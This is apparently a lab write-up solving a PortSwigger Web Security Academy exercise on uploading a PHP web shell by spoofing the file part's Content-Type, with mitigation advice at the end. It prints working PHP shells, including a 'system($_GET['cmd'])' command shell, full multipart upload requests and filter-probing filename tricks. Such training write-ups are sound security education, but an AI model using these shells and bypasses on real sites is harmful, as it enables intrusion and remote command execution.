# 📘 PortSwigger Lab: Web shell upload via Content-Type restriction bypass

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass  
> 🎯 Topic: Unrestricted File Upload — bypassing Content-Type validation  
> 🧪 Difficulty: Apprentice  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🎭 What Is Content-Type and Why It Cannot Be Trusted](#content-type)
- [🐚 Web Shell](#webshell)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Recon the Upload Function](#step1)
- [🔍 Step 2 — Determine the File Serving Path](#step2)
- [🔍 Step 3 — Attempt the PHP Shell Upload and Map the Filter](#step3)
- [🔍 Step 4 — Bypass the Filter via Content-Type Spoofing](#step4)
- [🔍 Step 5 — Execute the Shell and Retrieve the Secret](#step5)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Bypass the MIME-type validation on file upload to:

```text
1. Upload a PHP web shell disguised as image/jpeg.
2. Execute the shell via a GET request to the uploaded file.
3. Exfiltrate the contents of /home/carlos/secret and submit it as the solution.
```

Test user credentials:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Short Theory

When files are uploaded via `multipart/form-data`, the browser adds a header to each part:

```text
Content-Type: image/jpeg
```

Developers often use this header for validation: "only images are allowed". The flaw is that **Content-Type is client-controlled data**: an attacker can set it to anything via Burp.

Validation based on Content-Type is a classic case of trusting untrusted input:

```text
The client sends:  Content-Type: image/jpeg
The server trusts: "this is an image"
Reality:           the body contains PHP code
```

The header describes what the file **claims** to be, not what it actually is. Real type validation requires server-side content analysis (magic bytes).

---

<a id="idea"></a>

## 🧩 Core Idea

The file extension (`exploit.php`) passes validation **unchanged** — the filter only inspects the Content-Type part. A single field in the request is enough:

```text
filename="exploit.php"          ← kept as-is
Content-Type: image/jpeg        ← changed from application/x-php
```

```text
Filter:  looks only at Content-Type → sees image/jpeg → passes
Server:  stores exploit.php in /files/avatars/
Client:  GET /files/avatars/exploit.php → PHP executes → RCE
```

---

<a id="content-type"></a>

## 🎭 What Is Content-Type and Why It Cannot Be Trusted

In a multipart request, each part looks like this:

```text
--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php ... ?>
--------------------
```

Both `filename` and `Content-Type` are formed **on the attacker's browser side**. The server receives them as text and may store the file with any name and any "declared" type.

Comparison of sources of truth about the file type:

```text
Request Content-Type  → attacker-controlled      ✗ unreliable
File extension        → attacker-controlled      ✗ unreliable
Content magic bytes   → determined by the server ✓ reliable
```

Reliable validation reads the first bytes of the file (`FF D8 FF` — JPEG, `89 50 4E 47` — PNG) or processes the file through an image handler.

---

<a id="webshell"></a>

## 🐚 Web Shell

Minimal PHP shell for reading the target file:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Universal variant with command execution:

```php
<?php echo system($_GET['cmd']); ?>
```

The first one is enough to solve the lab.

---

<a id="exploit"></a>

## ⚡ The Exploit Payload

File to upload (`exploit.php`):

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The only modification to the upload request — changing the file part's Content-Type:

```text
Content-Type: application/x-php   →   Content-Type: image/jpeg
```

---

<a id="step1"></a>

## 🔍 Step 1 — Recon the Upload Function

1. Log in as `wiener:peter`.
2. Upload a normal image as the avatar.
3. Return to the account page.

---

<a id="step2"></a>

## 🔍 Step 2 — Determine the File Serving Path

In Burp → Proxy → HTTP history, find the request that fetched the avatar:

```http
GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
```

The path `/files/avatars/` is a web-accessible directory. Send this request to Repeater (it will be needed later to invoke the shell).

---

<a id="step3"></a>

## 🔍 Step 3 — Attempt the PHP Shell Upload and Map the Filter

1. Create a local `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Attempt to upload it as the avatar.

3. The server response reveals the filter logic:

```text
You can only upload files with MIME type image/jpeg or image/png.
```

Filter mapping:

```text
The filter checks:   the Content-Type of the multipart part
Allowed:             image/jpeg, image/png
The .php extension:  NOT checked (developer mistake)
```

---

<a id="step4"></a>

## 🔍 Step 4 — Bypass the Filter via Content-Type Spoofing

1. In HTTP history, find the original upload request:

```http
POST /my-account/avatar
```

and send it to Repeater.

2. Locate the file part in the body and change its Content-Type:

```text
Was:   Content-Type: application/x-php
Now:   Content-Type: image/jpeg
```

Do **not** change `filename="exploit.php"`.

3. Send the request. Response:

```text
The file avatars/exploit.php has been uploaded.
```

The server accepted the `.php` file, trusting the declared Content-Type.

---

<a id="step5"></a>

## 🔍 Step 5 — Execute the Shell and Retrieve the Secret

1. Switch to the Repeater tab with the `GET /files/avatars/<YOUR-IMAGE>` request.
2. Replace the image name with `exploit.php`:

```http
GET /files/avatars/exploit.php HTTP/1.1
```

3. Send — the server executes the PHP, and the response contains the secret:

```text
SECRET-VALUE-HERE
```

4. Submit the secret via the button in the lab banner.

The lab is marked:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Example Requests

### Recon: avatar serving

```http
GET /files/avatars/avatar.png HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### Blocked upload (baseline)

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

Response:

```text
You can only upload files with MIME type image/jpeg or image/png.
```

### Working upload — Content-Type spoofed

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

### Request to the shell

```http
GET /files/avatars/exploit.php HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

---

<a id="response"></a>

## 📥 Example Result

### Working upload response

```text
The file avatars/exploit.php has been uploaded.
```

### Shell response

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

SECRET-VALUE-HERE
```

Lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter
2. Upload a test image, find /files/avatars/ in HTTP history
3. Send the avatar-serving GET request to Repeater
4. Attempt to upload exploit.php → receive the MIME filter message
5. Find POST /my-account/avatar in HTTP history, send to Repeater
6. Change the file part's Content-Type to image/jpeg (keep filename)
7. Send → the file is uploaded as avatars/exploit.php
8. In the GET /files/avatars/ request, replace the image name with exploit.php
9. The server executes the PHP; the secret is returned in the response
10. Submit the secret — the lab is Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. Validation Based on Client Data

The `Content-Type` in a multipart request is formed on the attacker's side. The check trusts untrusted input.

### 2. The Filter Checks Only Content-Type

The extension `filename="exploit.php"` passes without inspection. The developer assumed the MIME type and the extension always agree — they do not.

### 3. The File Is Stored Under Its Original Name in a Web-Accessible Directory

`/files/avatars/exploit.php` is directly reachable over HTTP.

### 4. The Server Executes PHP in the Upload Directory

The PHP interpreter processes `.php` files in `/files/avatars/` — the uploaded code becomes executed code, providing RCE.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When facing an upload block, always ask:

```text
What exactly is validated: the extension? the Content-Type? the content?
```

```text
Content-Type and the filename are client-side data —
they can be changed independently of each other.
```

Probes to map the filter:

```text
shell.php                  → determine the baseline reaction
shell.php + CT: image/jpeg → Content-Type bypass
shell.png (PHP inside)     → content bypass
SHELL.PHP                  → case variation
shell.php.jpg              → double extension
```

A server error revealing the allowed types ("only image/jpeg or image/png") is a free filter map: it tells you exactly what is checked and how.

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following can be compared:

### Spoofing to image/png

```text
Content-Type: image/png  → should also pass (both types are allowed)
```

### Universal command shell

```php
<?php echo system($_GET['cmd']); ?>
```

```text
GET /files/avatars/exploit.php?cmd=whoami
GET /files/avatars/exploit.php?cmd=ls+/home/carlos
```

### Confirming the checks are independent

```text
filename="exploit.php"  + Content-Type: image/jpeg         → passes (Content-Type is checked)
filename="exploit.txt"  + Content-Type: application/x-php  → depends on the filter
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Changing the Filename Together with Content-Type

If you rename the file to `exploit.jpg`, the server stores it as `.jpg` — PHP will not execute. Change **only the Content-Type**.

### Mistake 2. Editing the Wrong Part of the Multipart Body

The Content-Type changes in the **file part** (`name="avatar"`), not in the request header (`Content-Type: multipart/form-data` — do not touch it).

### Mistake 3. Not Finding the File Serving Path Before Uploading the Shell

Take the GET request to `/files/avatars/` from HTTP history in advance — otherwise there is nothing to compare the path against later.

### Mistake 4. Using the Request-Level Content-Type

The validated Content-Type is the one in the **file part** inside the multipart body, not the `Content-Type: multipart/form-data; boundary=...` header.

### Mistake 5. Reading the Source Instead of Executing

If the request to the shell returns PHP code as text — the server does not execute it in that directory, and another vector is needed.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Never Validate Based on the Request Content-Type

The client header is a declared type, not the actual one. Never use it as the only check.

### 2. Validate Content (Magic Bytes)

Read the first bytes of the file and compare against the expected format:

```text
JPEG: FF D8 FF
PNG:  89 50 4E 47
```

### 3. Image Reprocessing

Open the file with an image-processing library and re-save it — embedded payloads are stripped.

### 4. Extension Whitelist

Allow only `jpg`, `jpeg`, `png`, `webp` — reject everything else.

### 5. Random File Names

Generate the name server-side (UUID) instead of storing `exploit.php`.

### 6. Storage Outside the Web Root and Execution Ban

Store uploads in non-executable directories; at the web-server level, disable script handling in upload directories.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Logged in as wiener:peter
- [ ] Uploaded a test image
- [ ] Found `GET /files/avatars/<image>` in HTTP history → serving path
- [ ] Sent the GET request to Repeater

### Filter Mapping

- [ ] The `exploit.php` upload was blocked
- [ ] The message reveals the filter: only image/jpeg and image/png
- [ ] Understood that the part's Content-Type is checked, not the extension

### Exploitation

- [ ] In POST /my-account/avatar, changed the part's Content-Type to image/jpeg
- [ ] Kept filename as exploit.php
- [ ] File uploaded: `avatars/exploit.php`
- [ ] GET /files/avatars/exploit.php executed
- [ ] Secret retrieved and submitted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved by bypassing **Content-Type** validation:

```text
1. The filter trusts the client-supplied Content-Type of the multipart part
2. exploit.php uploaded with a spoofed Content-Type: image/jpeg
3. The .php extension was preserved — the server executes the shell
4. GET /files/avatars/exploit.php → the secret is read
```

Main lessons:

```text
Content-Type, filename, and the extension are client-side data — never trust them.
```

```text
Validating one field (MIME) while ignoring another (extension) is a typical validation gap.
```

```text
Error messages revealing filter rules are free reconnaissance for the attacker.
```

```text
Reliable validation: magic bytes + image reprocessing + whitelist + no execution in upload directories.
```

---

[⬆ Back to top](#top)
